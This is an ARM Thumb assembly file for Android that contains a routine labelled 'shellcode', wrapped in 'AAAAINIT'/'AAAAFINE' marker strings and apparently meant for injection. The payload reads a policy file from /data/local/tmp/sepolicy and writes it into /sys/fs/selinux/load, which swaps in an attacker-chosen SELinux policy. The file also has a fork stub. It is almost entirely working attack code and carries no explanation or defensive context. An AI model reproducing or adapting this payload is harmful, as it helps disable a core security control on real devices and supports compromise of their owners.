	.text
	.align	2

	
	
.global	main
.code	16

.thumb_func
.type	main, %function
main:
	push	{r3, lr}
	bl	prova
	@ sp needed
	mov	r0, #0
	pop	{r3, pc}	
	
	
	
.global	prova	
.code	16	
.thumb_func
	
prova:
     
    
    push    {r7, lr}
    b shellcode
    
forkexec:
    NOP
    NOP
    NOP
    NOP
    NOP
    NOP
    MOV            R7, #2
    SVC             0
    CMP             R0, #0 
    BEQ             shellcode
    NOP
    NOP
   

uscita:
    pop     {r7, pc} //BD E8 F0 8F
   
    NOP
    NOP
    
 .ascii "AAAAINIT" 
shellcode:
    NOP
    NOP
    NOP
    NOP
    sub sp, #128
    
    

    mov r1, #0101
    mov r0, pc
    add r0, #12
    mov r2, #077
    mov r7, #5
    svc 0
    
    str     r0, [sp, #4]  
    
     
    b __1
nop

    .ascii "/sys/fs/selinux/load","\000\000"    
    
__1:
     
    mov r1, #0000
    mov r0, pc
    add r0, #12
    mov r2, #077
    mov r7, #5
    svc 0
    str     r0, [sp, #8]  
    b __2
    nop
    .ascii "/data/local/tmp/sepolicy","\000\000"    
    
__2:
    
    
    ldr r0, [sp, #8]
    mov r1, #0 // off 
    mov r2, #2 // SEEK_END
    mov r7, #19 // lseek
    svc 0
    str     r0, [sp, #12] //size
    
   
    // lseek back to beginning
    ldr r0, [sp, #8]
    mov r1, #0 // off
    mov r2, #0 // SEEK_SET
    mov r7, #19 // lseek
    svc 0
    
    // mmap
    mov r0, #0
    ldr     r1, [sp, #12] //size
    mov r2, #1 // PROT_READ
    mov r3, #2 // MAP_PRIVATE
    ldr r4, [sp, #8] 
    mov r5, #0  // off
    mov r7, #0xc0 //mmap
    svc 0
    str     r0, [sp, #16] //mmap addr
    
    
    
    
    // write to the selinux load file
    ldr     r0, [sp, #4] //fd dest  
    ldr     r1, [sp, #16]
   
   ldr     r2, [sp, #12]
    mov r7, #4

    svc 0
    
   // ldr r0,[r0,#0]
      //ldr     r0, [sp, #12]
   // mov r7, #1
    //svc 0
    
    
    
    // unmap mem
    ldr     r0, [sp, #16]
    ldr     r1, [sp, #12]
    mov r7, #91
    svc 0

    // close the files
    ldr     r0, [sp, #8]
    mov r7, #6
    svc 0

    ldr     r0, [sp, #4]
     mov r7, #6
    svc 0
    
    

     add sp, #128
   
NOP
nop

.ascii "AAAAFINE" 
	
